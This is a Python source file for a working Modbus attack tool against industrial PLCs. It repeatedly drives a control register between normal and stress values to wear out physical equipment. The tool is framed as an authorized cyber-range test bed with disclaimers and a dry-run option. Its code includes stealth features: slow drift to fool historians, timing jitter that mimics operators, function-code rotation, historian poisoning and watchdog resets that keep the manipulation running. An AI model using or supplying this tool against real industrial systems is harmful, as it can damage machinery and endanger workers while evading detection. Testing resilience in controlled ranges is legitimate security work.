#!/usr/bin/env python3
"""
Cyclic Stress Attack Simulation - Government Grade Test Bed
Author: Ridpath
GitHub: https://github.com/ridpath

DISCLAIMER: 
This tool is for AUTHORIZED SECURITY TESTING and RESEARCH ONLY. 
Use only on systems you own or have explicit written permission to test.
Unauthorized use may be illegal and unethical.

Purpose:
Simulates cyclic stress attacks on industrial equipment to test resilience
and detection capabilities in controlled cyber range environments.

MITRE ICS ATT&CK Techniques:
- T0858 - Unauthorized Command Message
- T0804 - Manipulation of Control
- T0814 - Modify Controller Tasking

Supported Modes:
| Mode | Behavior | Blue Team Value |
|------|----------|----------------|
| cyclic | abrupt surge / return | spike-based alert tuning |
| slow-drift | historian stealth | detection of stealthy degradation |
| randomized | jitter anomalies | ML anomaly labelling |
| blend (future) | protocol fallback | DPI bypass testing |
"""

import time
import argparse
import logging
import sys
import random
import json
import os
from typing import Optional, Dict, Any
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException

class CyclicStressAttack:
    def __init__(self, target_ip: str, port: int = 502):
        self.target_ip = target_ip
        self.port = port
        self.client = None
        self.running = False
        self.cycle_count = 0
        self.last_good = None
        self.register_address = None
        self.logger = logging.getLogger('CyclicStressAttack')
        
        # Safety limits
        self.MAX_STRESS_VALUE = 5000
        self.MIN_SAFE_VALUE = 0
        
        # Configurable parameters
        self.register_type = 'holding'
        self.attack_mode = 'cyclic'
        self.stealth = False
        self.interlock_address = None
        self.interlock_active_value = 1
        self.watchdog_address = None
        self.watchdog_value = 1
        self.watchdog_interval = 10
        self.rotate_fc = False
        self.variation = 10
        self.poison_historian = False
        self.historian_address = None
        self.dry_run = False
        self.json_log_file = None
        
    def configure(self, args):
        self.register_type = args.register_type
        self.attack_mode = args.attack_mode
        self.stealth = args.stealth
        self.interlock_address = args.interlock_address
        self.interlock_active_value = args.interlock_active_value
        self.watchdog_address = args.watchdog_address
        self.watchdog_value = args.watchdog_value
        self.watchdog_interval = args.watchdog_interval
        self.rotate_fc = args.rotate_fc
        self.variation = args.variation
        self.poison_historian = args.poison_historian
        self.historian_address = args.historian_address
        self.dry_run = args.dry_run
        self.json_log_file = args.log_json
        
    def safety_check(self, value: int) -> bool:
        """Validate that values are within safe testing ranges"""
        if self.register_type == 'coil':
            if value not in (0, 1):
                self.logger.error(f"Coil value must be 0 or 1, got {value}")
                return False
        else:
            if value > self.MAX_STRESS_VALUE:
                self.logger.error(f"Value {value} exceeds safety limit {self.MAX_STRESS_VALUE}")
                return False
            if value < self.MIN_SAFE_VALUE:
                self.logger.error(f"Value {value} below minimum safe limit {self.MIN_SAFE_VALUE}")
                return False
        return True
        
    def connect(self) -> bool:
        """Establish connection to target PLC with error handling"""
        try:
            self.logger.info(f"Attempting connection to {self.target_ip}:{self.port}")
            self.client = ModbusTcpClient(
                host=self.target_ip,
                port=self.port,
                timeout=5,
                retries=3
            )
            
            if self.client.connect():
                self.logger.info("Successfully connected to PLC")
                return True
            else:
                self.logger.error("Failed to connect to PLC")
                return False
                
        except ModbusException as e:
            self.logger.error(f"Modbus connection error: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Unexpected connection error: {e}")
            return False
    
    def disconnect(self):
        """Safely disconnect from PLC"""
        if self.client:
            try:
                self.client.close()
                self.logger.info("Disconnected from PLC")
            except Exception as e:
                self.logger.error(f"Error during disconnect: {e}")
    
    def read_value(self, address: int) -> int:
        """Read value from coil or holding register with function code rotation"""
        try:
            if not self.client or not self.client.is_socket_open():
                if not self.connect():
                    raise ModbusException("No active connection to PLC")
            
            if self.register_type == 'coil':
                if self.rotate_fc and random.random() > 0.5:
                    rr = self.client.read_discrete_inputs(address, 1)
                else:
                    rr = self.client.read_coils(address, 1)
                if rr.isError():
                    raise ModbusException("Read error")
                return int(rr.bits[0])
            else:
                rr = self.client.read_holding_registers(address, 1)
                if rr.isError():
                    raise ModbusException("Read error")
                return rr.registers[0]
        except Exception as e:
            self.logger.error(f"Read failed: {e}")
            raise
    
    def write_value_safe(self, address: int, value: int) -> bool:
        """Safely write to coil or holding register with function code rotation"""
        if self.dry_run:
            self.logger.warning(f"DRY RUN - Would write {value} to {address}")
            return True
            
        if not self.safety_check(value):
            return False
            
        if not self.client or not self.client.is_socket_open():
            self.logger.error("No active connection to PLC")
            return False
            
        try:
            if self.register_type == 'coil':
                bool_value = bool(value)
                if self.rotate_fc and random.random() > 0.5:
                    result = self.client.write_coils(address, [bool_value])
                else:
                    result = self.client.write_coil(address, bool_value)
            else:
                if self.rotate_fc and random.random() > 0.5:
                    result = self.client.write_registers(address, [value])
                else:
                    result = self.client.write_register(address, value)
            if result.isError():
                self.logger.error(f"Modbus write error: {result}")
                return False
            else:
                self.logger.debug(f"Successfully wrote value {value} to address {address}")
                return True
                
        except ModbusException as e:
            self.logger.error(f"Modbus exception during write: {e}")
            return False
        except Exception as e:
            self.logger.error(f"Unexpected error during write: {e}")
            return False
    
    def write_and_verify(self, address: int, value: int) -> bool:
        """Write value with verification, reconnection handling, and structured logging"""
        if not self.client or not self.client.is_socket_open():
            self.logger.warning("Socket closed - attempting reconnect")
            if not self.connect():
                return False
        
        if not self.write_value_safe(address, value):
            return False

        # Verify PLC state to ensure manipulation took effect
        try:
            read_back = self.read_value(address)
            expected = value if self.register_type != 'coil' else int(bool(value))
            if read_back != expected:
                self.logger.warning(f"Value mismatch! Sent: {value}, Read: {read_back}")
                return False
            
            # Emit structured log for detection testing with MITRE ICS ATT&CK mapping
            event = {
                "event": "modbus_write",
                "technique_id": "T0858",
                "tactic": "Execution",
                "protocol": "modbus",
                "register": address,
                "value": value,
                "cycle": self.cycle_count,
                "mode": self.attack_mode,
                "stealth": self.stealth,
                "timestamp": time.time()
            }
            
            # Log to standard logger
            self.logger.info(json.dumps(event))
            
            # Append to JSON log file if specified
            if self.json_log_file:
                try:
                    with open(self.json_log_file, 'a') as f:
                        f.write(json.dumps(event) + '\n')
                except Exception as e:
                    self.logger.error(f"Failed to write to JSON log file: {e}")
            
            return True
        except Exception as e:
            self.logger.error(f"Verification failed: {e}")
            return False
    
    def is_safe_to_write(self) -> bool:
        """Check if state machine interlock allows writing"""
        if self.interlock_address is None:
            return True
        try:
            interlock = self.read_value(self.interlock_address)
            return interlock != self.interlock_active_value
        except:
            self.logger.error("Failed to read interlock")
            return False
    
    def reset_watchdog(self):
        """Reset watchdog if configured"""
        if self.watchdog_address is not None:
            self.write_value_safe(self.watchdog_address, self.watchdog_value)
    
    def sleep_with_watchdog(self, duration: float, jitter: bool = False) -> None:
        """Sleep with interrupt checking, jitter, and watchdog resets"""
        total_sleep = duration + (random.uniform(-2, 2) if jitter else 0)
        watchdog_counter = 0
        remaining = total_sleep
        while remaining > 0 and self.running:
            sleep_time = min(1.0, remaining)
            time.sleep(sleep_time)
            remaining -= sleep_time
            watchdog_counter += sleep_time
            if watchdog_counter >= self.watchdog_interval:
                self.reset_watchdog()
                watchdog_counter = 0
    
    def ramp_to_value(self, address: int, target: int, duration: int) -> bool:
        """Gradually ramp to target value"""
        try:
            current = self.read_value(address)
        except:
            current = self.last_good or 0
        
        if current == target:
            self.sleep_with_watchdog(duration, jitter=True)
            return True
        
        step_time = 1.0
        steps = max(1, int(duration / step_time))
        delta = (target - current) / steps
        
        for i in range(steps):
            if not self.running:
                return False
            if not self.is_safe_to_write():
                continue
            val = int(current + delta * (i + 1))
            if not self.safety_check(val):
                break
            self.write_and_verify(address, val)
            self.sleep_with_watchdog(step_time, jitter=True)
        return True
    
    def random_perturb(self, address: int, base: int, duration: int) -> bool:
        """Apply random perturbations around base value"""
        step_time = 1.0
        steps = max(1, int(duration / step_time))
        for _ in range(steps):
            if not self.running:
                return False
            if not self.is_safe_to_write():
                continue
            val = base + random.randint(-self.variation, self.variation)
            if not self.safety_check(val):
                continue
            self.write_and_verify(address, val)
            self.sleep_with_watchdog(step_time, jitter=True)
        return True
    
    def apply_phase(self, target: int, duration: int, address: int, phase: str) -> bool:
        """Apply phase based on attack mode"""
        self.logger.info(f"Cycle {self.cycle_count + 1}: Applying {phase} phase with target {target}")
        
        use_drift = self.attack_mode == 'slow-drift' or (self.stealth and self.attack_mode == 'cyclic')
        
        if use_drift:
            success = self.ramp_to_value(address, target, duration)
        elif self.attack_mode == 'randomized':
            success = self.random_perturb(address, target, duration)
        else:
            # Cyclic: abrupt change
            if not self.is_safe_to_write():
                self.logger.warning("Interlock active, skipping phase")
                return False
            success = self.write_and_verify(address, target)
            if success:
                self.sleep_with_watchdog(duration, jitter=True)
        
        if not success:
            self.logger.error(f"Failed to apply {phase} phase")
            return False
        
        # Historian poisoning if enabled
        if self.poison_historian and self.historian_address is not None:
            poison_value = target + random.randint(-self.variation, self.variation)
            if self.safety_check(poison_value):
                self.write_and_verify(self.historian_address, poison_value)
                self.logger.info(f"Poisoned historian with value {poison_value}")
        
        return True
    
    def execute_attack(self, 
                      normal_value: int = 1500,
                      stress_value: int = 3000,
                      normal_duration: int = 300,
                      stress_duration: int = 60,
                      register_address: int = 100,
                      max_cycles: Optional[int] = None):
        """
        Execute cyclic stress attack with comprehensive monitoring
        
        Args:
            normal_value: Normal operating value for the process
            stress_value: Stress value that simulates attack conditions
            normal_duration: Duration in seconds for normal operation phase
            stress_duration: Duration in seconds for stress operation phase  
            register_address: Modbus register address to manipulate
            max_cycles: Maximum number of cycles (None for infinite)
        """
        if self.attack_mode == 'blend':
            self.logger.error("Protocol blending not implemented")
            return
        
        # Store register address for proper restoration
        self.register_address = register_address
        
        # Pre-execution safety checks
        if not self.safety_check(normal_value) or not self.safety_check(stress_value):
            self.logger.error("Safety check failed - aborting attack")
            return
            
        if not self.dry_run and not self.connect():
            self.logger.error("Cannot start attack - connection failed")
            return
        
        # Read last good value
        try:
            if not self.dry_run:
                self.last_good = self.read_value(register_address)
                self.logger.info(f"Recorded last good value: {self.last_good}")
            else:
                self.last_good = normal_value
                self.logger.info(f"DRY RUN - Using normal value as last good: {self.last_good}")
        except:
            self.last_good = normal_value
            self.logger.warning(f"Using default normal value as last good: {self.last_good}")
        
        self.running = True
        self.cycle_count = 0
        
        self.logger.info("=== CYCLIC STRESS ATTACK STARTED ===")
        self.logger.info(f"Target: {self.target_ip}:{self.port}")
        self.logger.info(f"Register: {register_address}")
        self.logger.info(f"Normal: {normal_value} for {normal_duration}s")
        self.logger.info(f"Stress: {stress_value} for {stress_duration}s")
        self.logger.info(f"Max cycles: {max_cycles if max_cycles else 'Infinite'}")
        self.logger.info(f"Attack mode: {self.attack_mode}")
        self.logger.info(f"Stealth: {self.stealth}")
        self.logger.info(f"Dry run: {self.dry_run}")
        if self.json_log_file:
            self.logger.info(f"JSON telemetry: {self.json_log_file}")
        
        try:
            while self.running and (max_cycles is None or self.cycle_count < max_cycles):
                if not self.running:
                    break
                
                # Stress phase
                if not self.apply_phase(stress_value, stress_duration, register_address, "stress"):
                    self.logger.error("Stress phase failed - stopping attack")
                    break
                
                if not self.running:
                    break
                
                # Normal phase
                if not self.apply_phase(normal_value, normal_duration, register_address, "normal"):
                    self.logger.error("Normal phase failed - stopping attack")
                    break
                
                self.cycle_count += 1
                self.logger.info(f"Completed cycle {self.cycle_count}")
                
        except KeyboardInterrupt:
            self.logger.info("Attack interrupted by user")
        except Exception as e:
            self.logger.error(f"Attack execution error: {e}")
        finally:
            self.stop_attack()
    
    def stop_attack(self):
        """Safely stop the attack and restore normal operations"""
        self.logger.info("Stopping attack...")
        self.running = False
        
        # Attempt to restore last known good value to the correct register
        try:
            if self.client and self.client.is_socket_open() and self.last_good is not None and self.register_address is not None:
                self.write_and_verify(self.register_address, self.last_good)
                self.logger.info(f"Restored last known good value {self.last_good} to register {self.register_address}")
        except Exception as e:
            self.logger.error(f"Error restoring safe value: {e}")
        
        self.disconnect()
        self.logger.info(f"Attack stopped after {self.cycle_count} cycles")

def main():
    """Main execution function with command line interface"""
    parser = argparse.ArgumentParser(
        description='Cyclic Stress Attack Simulation for ICS/SCADA Security Testing - Government Grade',
        epilog='AUTHORIZED USE ONLY - FOR SECURITY RESEARCH AND TESTING'
    )
    
    parser.add_argument(
        'target', 
        help='Target PLC IP address (AUTHORIZED SYSTEMS ONLY)'
    )
    
    parser.add_argument(
        '--port', 
        type=int, 
        default=502, 
        help='Modbus port (default: 502)'
    )
    
    parser.add_argument(
        '--normal-value', 
        type=int, 
        default=1500, 
        help='Normal operating value (default: 1500)'
    )
    
    parser.add_argument(
        '--stress-value', 
        type=int, 
        default=3000, 
        help='Stress value for attack (default: 3000)'
    )
    
    parser.add_argument(
        '--normal-duration', 
        type=int, 
        default=300, 
        help='Normal phase duration in seconds (default: 300)'
    )
    
    parser.add_argument(
        '--stress-duration', 
        type=int, 
        default=60, 
        help='Stress phase duration in seconds (default: 60)'
    )
    
    parser.add_argument(
        '--register', 
        type=int, 
        default=100, 
        help='Modbus register address (default: 100)'
    )
    
    parser.add_argument(
        '--cycles', 
        type=int, 
        help='Maximum number of cycles (default: infinite)'
    )
    
    parser.add_argument(
        '--verbose', 
        action='store_true',
        help='Enable verbose debug logging'
    )
    
    parser.add_argument(
        '--stealth',
        action='store_true',
        help='Randomize timing to mimic legitimate operator changes'
    )
    
    parser.add_argument(
        '--attack-mode',
        choices=['cyclic', 'slow-drift', 'randomized', 'blend'],
        default='cyclic',
        help='Attack mode (default: cyclic)'
    )
    
    parser.add_argument(
        '--register-type',
        choices=['holding', 'coil'],
        default='holding',
        help='Register type: holding or coil (default: holding)'
    )
    
    parser.add_argument(
        '--interlock-address',
        type=int,
        default=None,
        help='Interlock register address'
    )
    
    parser.add_argument(
        '--interlock-active-value',
        type=int,
        default=1,
        help='Value indicating interlock active (default: 1)'
    )
    
    parser.add_argument(
        '--watchdog-address',
        type=int,
        default=None,
        help='Watchdog reset register address'
    )
    
    parser.add_argument(
        '--watchdog-value',
        type=int,
        default=1,
        help='Value to write to watchdog (default: 1)'
    )
    
    parser.add_argument(
        '--watchdog-interval',
        type=int,
        default=10,
        help='Watchdog reset interval in seconds (default: 10)'
    )
    
    parser.add_argument(
        '--rotate-fc',
        action='store_true',
        help='Rotate Modbus function codes'
    )
    
    parser.add_argument(
        '--variation',
        type=int,
        default=10,
        help='Variation range for randomized modes (default: 10)'
    )
    
    parser.add_argument(
        '--poison-historian',
        action='store_true',
        help='Enable historian poisoning'
    )
    
    parser.add_argument(
        '--historian-address',
        type=int,
        default=None,
        help='Historian register address for poisoning'
    )
    
    parser.add_argument(
        '--dry-run',
        action='store_true',
        help='Simulate execution without sending Modbus packets'
    )
    
    parser.add_argument(
        '--log-json',
        type=str,
        default=None,
        help='Export telemetry to JSON file for ML anomaly detection'
    )
    
    args = parser.parse_args()
    
    # Set logging level
    if args.verbose:
        level = logging.DEBUG
    elif args.stealth:
        level = logging.WARNING
    else:
        level = logging.INFO
    
    logging.basicConfig(
        level=level,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('cyclic_stress_attack.log'),
            logging.StreamHandler(sys.stdout)
        ]
    )
    
    # Authorization warning
    print("\n" + "="*70)
    print("AUTHORIZATION WARNING")
    print("This tool should ONLY be used on systems you own or have")
    print("explicit written permission to test. Unauthorized use may")
    print("be illegal and violate terms of service.")
    print("="*70 + "\n")
    
    confirmation = input("Do you have proper authorization to proceed? (yes/NO): ")
    if confirmation.lower() != 'yes':
        print("Operation cancelled - authorization not confirmed")
        sys.exit(1)
    
    # Create and configure attack
    attack = CyclicStressAttack(args.target, args.port)
    attack.configure(args)
    
    try:
        attack.execute_attack(
            normal_value=args.normal_value,
            stress_value=args.stress_value,
            normal_duration=args.normal_duration,
            stress_duration=args.stress_duration,
            register_address=args.register,
            max_cycles=args.cycles
        )
    except Exception as e:
        attack.logger.error(f"Attack execution failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
